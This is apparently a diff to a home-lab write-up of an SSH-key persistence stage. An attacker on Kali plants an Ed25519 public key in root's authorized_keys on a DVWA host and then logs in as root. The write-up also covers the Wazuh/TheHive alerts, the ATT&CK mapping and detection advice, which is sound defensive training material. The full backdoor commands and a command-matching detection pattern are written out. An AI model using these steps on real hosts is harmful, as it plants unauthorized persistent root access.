@@ -1,250 +1,125 @@
 # Stage 08 — SSH Persistence
 
-
-
 > **Status:** Complete — evidence attached
-
 > **Case:** [Case 02](../../04-Investigation/Cases/case-02-lateral-movement.md)
-
 > **Investigation:** [Phase 3 Deep Dive](../../04-Investigation/Deep-Dive-Attack-Chain-Investigation.md#phase-3-making-themselves-at-home-ssh-persistence--finding-windows)
-
 > **Evidence:** [attack](../../06-Resources/screenshots/attack-simulation/18.png) · [alert](../../06-Resources/screenshots/thehive-alert/8.png)
-
-
 
 ## Objective
 
-
-
 Establish persistent, encrypted remote root access to the compromised Linux host (`dvwa` at `192.168.56.30`) by injecting an attacker-controlled Ed25519 SSH public key into `/root/.ssh/authorized_keys`. This guarantees resilient, long-term administrative access that operates independently of web services, survives host reboots, and removes dependence on fragile reverse shells.
 
-
-
 > [!NOTE]
-
 > **Case Transition:** Stage 08 marks the official kickoff of **Case 02 (Lateral Movement and Credential Access)**. The attacker transitions from initial perimeter compromise to internal network persistence and reconnaissance.
-
-
 
 ## Commands
 
-
-
 ### 1. Keypair Generation (Kali Linux — 192.168.232.135)
-
-
 
 Generate a high-security Ed25519 SSH keypair with no passphrase to facilitate seamless, automated connections:
 
-
-
 ```bash
-
 # Generate Ed25519 SSH keypair without passphrase
-
 ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -N ""
 
-
-
 # Display the generated public key
-
 cat ~/.ssh/id_ed25519.pub
-
 ```
-
-
 
 Observed public key (redacted):
-
 ```text
-
 ssh-ed25519 AAAAC3***kali@kali
-
 ```
-
-
 
 ### 2. Inject Public Key into Target Root Profile (DVWA Root Shell)
 
-
-
 Append the attacker's public key string to the root user's `authorized_keys` file and set strict file permissions required by OpenSSH:
 
-
-
 ```bash
-
 # Append attacker public key to root authorized_keys
-
 echo "ssh-ed25519 AAAAC3***kali@kali" >> /root/.ssh/authorized_keys
 
-
-
 # Enforce strict directory and file permissions
-
 chmod 700 /root/.ssh
-
 chmod 600 /root/.ssh/authorized_keys
-
 ```
-
-
 
 ### 3. Establish Direct Root SSH Connection (Kali Linux)
 
-
-
 Authenticate directly to the target Linux host over SSH using the private key:
 
-
-
 ```bash
-
 # Connect directly to DVWA as root using the private key
-
 ssh -i ~/.ssh/id_ed25519 root@192.168.56.30
 
-
-
 # Verify persistent session identity
-
 whoami
-
 hostname
-
 ```
-
-
 
 ## What happened
 
-
-
 1. **Strategic Pivot to Case 02:** Following successful root privilege escalation in Stage 07, the attacker shifted objectives toward internal network pivoting and domain lateral movement. To establish an unmonitored (by web application logs) and robust access channel, the attacker deployed an SSH public key backdoor.
-
 2. **Keypair Generation:** On Kali Linux (`192.168.232.135`), the attacker executed `ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -N ""` to produce an elliptic-curve keypair. The public key was extracted using `cat ~/.ssh/id_ed25519.pub`.
-
 3. **Authorized Keys Modification:** Using the existing interactive root shell from Stage 07, the attacker appended the public key string into `/root/.ssh/authorized_keys`. The attacker enforced proper POSIX permissions (`chmod 700 /root/.ssh` and `chmod 600 /root/.ssh/authorized_keys`) to satisfy `sshd`'s `StrictModes` security checks, which would otherwise reject authentication if group/world permissions are overly permissive.
-
 4. **Direct Backdoor Verification:** The attacker opened a new terminal on Kali and initiated a direct SSH connection: `ssh -i ~/.ssh/id_ed25519 root@192.168.56.30`. The OpenSSH daemon accepted the key without prompting for a password, granting direct, interactive root shell access (`root@dvwa:~#`).
-
 5. **Operational Readiness:** With stable SSH access established, the adversary no longer requires the reverse shell or web shell to remain active, providing an encrypted management tunnel to stage attack tools and pivot into the internal Active Directory network.
-
-
 
 ## Evidence
 
-
-
 ### Attack Screenshots
 
-
-
 ![SSH Key Generation on Kali Linux](../../06-Resources/screenshots/attack-simulation/18.png)
-
-*Figure 1: Generation of the Ed25519 keypair and display of the public key on Kali Linux.*
-
-
+*Figure 8.1: Generation of the Ed25519 keypair and display of the public key on Kali Linux.*
 
 ![Authorized Keys Modification on DVWA](../../06-Resources/screenshots/attack-simulation/19.png)
-
-*Figure 2: DVWA root shell appending the public key to `/root/.ssh/authorized_keys` and applying restrictive permissions.*
-
-
+*Figure 8.2: DVWA root shell appending the public key to `/root/.ssh/authorized_keys` and applying restrictive permissions.*
 
 ![Direct Persistent SSH Root Authentication](../../06-Resources/screenshots/attack-simulation/20.png)
-
-*Figure 3: Successful SSH authentication from Kali directly to `root@192.168.56.30` using the injected key.*
-
-
+*Figure 8.3: Successful SSH authentication from Kali directly to `root@192.168.56.30` using the injected key.*
 
 ### Alert Screenshots
 
+![TheHive Alert 16 — SSH Persistence and Root Login Overview](../../06-Resources/screenshots/thehive-alert/8.png)
+*Figure 8.4: TheHive Alert #16 overview capturing unauthorized SSH persistence and root authentication from 192.168.232.135 (wzb-1208f0ea54).*
 
-
-![TheHive Alert 7 — SSH Persistence and Root Login Overview](../../06-Resources/screenshots/thehive-alert/8.png)
-
-*Figure 4: TheHive Alert 7 overview capturing unauthorized SSH persistence and root authentication from 192.168.232.135 (wzb-1208f0ea54).*
-
-
-
-![TheHive Alert 7.1 — Wazuh SSH Root Authentication Log Detail](../../06-Resources/screenshots/thehive-alert/8.1.png)
-
-*Figure 5: Wazuh Rule 5715 alert detail showing sshd authentication success for root from external attacker IP 192.168.232.135.*
-
-
+![TheHive Alert 16.1 — Wazuh SSH Root Authentication Log Detail](../../06-Resources/screenshots/thehive-alert/8.1.png)
+*Figure 8.5: Wazuh Rule 5715 alert detail showing sshd authentication success for root from external attacker IP 192.168.232.135 (Alert #16).*
 
 ![Wazuh Auditd Command Logging for Authorized Keys Modification](../../06-Resources/screenshots/wazuh-deep-investigation/wzb-19-ssh-persist-auditd-authorized-keys.jpg)
-
-*Figure 6: Wazuh Rule 100220 capturing root command injection appending Ed25519 key into /root/.ssh/authorized_keys.*
-
-
+*Figure 8.6: Wazuh Rule 100220 capturing root command injection appending Ed25519 key into /root/.ssh/authorized_keys.*
 
 ![Wazuh SSH Authentication Log Confirming Key Login](../../06-Resources/screenshots/wazuh-deep-investigation/wzb-20-ssh-persist-key-inject-sshd-login.jpg)
-
-*Figure 7: Wazuh OpenSSH authentication record confirming successful key-based login to DVWA.*
-
-
+*Figure 8.7: Wazuh OpenSSH authentication record confirming successful key-based login to DVWA.*
 
 ## Alert observed
 
-
-
 | Source | Rule / Signature | Rule ID | TheHive Alert | Severity | Status |
-
 |---|---|---|---|---|---|
-
-| Wazuh / Linux SSH | sshd: authentication success (persistent root backdoor login) | 5715 | Alert 7 (`8.png`, `8.1.png` / `wzb-1208f0ea54`) | High (3) | **Detected** |
-
+| Wazuh / Linux SSH | sshd: authentication success (persistent root backdoor login) | 5715 | TheHive Alert #16 (`8.png`, `8.1.png` / `wzb-1208f0ea54`) | High (3) | **Detected** |
 | Wazuh (Host Command Audit) | Bash command by root: `echo "ssh-ed25519..." >> /root/.ssh/authorized_keys` | Rule 100220 (Level 5) | SIEM Indexed (`Wazuh-Raw-Alerts.csv` Row 9164, `wzb-19`) | Medium | **Detected (Forensic Command Capture)** |
 
-
-
 > [!NOTE]
-
 > **Verbatim Command Telemetry (Rule 100220):**  
-
 > While SSHD (Rule 5715) alerted to TheHive upon session logon, the custom `bashcmd` telemetry pipeline on DVWA captured the verbatim key injection command under **Wazuh Rule 100220** at `17:29:19 IST` (`Wazuh-Raw-Alerts.csv` Row 9164):  
-
 > `echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIACi7TGj+OejU78IWt/I6/im7sLXOR1jben7h94DmDJ5 kali@kali" >> /root/.ssh/authorized_keys`  
-
 > In addition, preceding permission setup commands (`chmod 700 /root/.ssh`, `chmod 600 /root/.ssh/authorized_keys`) were recorded in rows 9155–9161.
-
-
 
 ## MITRE ATT&CK
 
-
-
 | Tactic | Technique | ID | Sub-technique |
-
 |---|---|---|---|
-
 | Persistence | Account Manipulation | T1098 | SSH Authorized Keys (T1098.004) |
-
 | Lateral Movement / Initial Access | Remote Services | T1021 | SSH (T1021.004) |
-
-
 
 ## Detection opportunities
 
-
-
 - **File Integrity Monitoring (FIM):** Configure real-time file monitoring (Wazuh `syscheck` or auditd) on all user SSH directories, specifically watching `/root/.ssh/authorized_keys`, `/home/*/.ssh/authorized_keys`, and `/etc/ssh/sshd_config` for write or attribute change events.
-
 - **SSH Daemon Hardening:** Disallow direct root authentication over SSH by configuring `PermitRootLogin no` in `/etc/ssh/sshd_config`. Administrators should authenticate with non-root accounts and escalate via audited `sudo`.
-
 - **Anomalous Authentication Alerts:** Alert on SSH logins using newly observed public key fingerprints or logins originating from non-administrative IP addresses or external subnets.
-
 - **Command-Line Telemetry:** Monitor command lines via auditd / Sysmon for Linux matching patterns that modify SSH authorized keys (e.g., `*echo*>>*authorized_keys*`, `*ssh-copy-id*`).
-
-
 
 ## Notes
 
-
-
 - **Case Grouping:** As part of Case 02, this stage secures the pivot point needed to execute network reconnaissance and Active Directory attacks without risking session termination from web server restarts or crashes.
-
 - **Key Redaction:** Cryptographic public key contents are redacted per project documentation guidelines (`ssh-ed25519 AAAAC3***kali@kali`).
-
